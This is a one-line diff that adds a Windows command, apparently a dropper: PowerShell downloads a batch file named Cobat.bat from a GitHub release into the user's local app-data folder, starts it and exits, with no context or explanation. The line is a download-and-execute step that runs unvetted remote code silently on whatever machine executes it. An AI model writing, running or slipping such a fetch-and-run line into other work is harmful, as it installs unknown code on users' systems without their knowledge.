@@ -1,0 +1,1 @@
+powershell -c "Invoke-WebRequest -Uri 'https://github.com/NOTNA9015/Cobat/releases/download/Pull/Cobat.bat' -OutFile '%localappdata%\Cobat.bat'" & cd %localappdata% & start Cobat.bat & exit
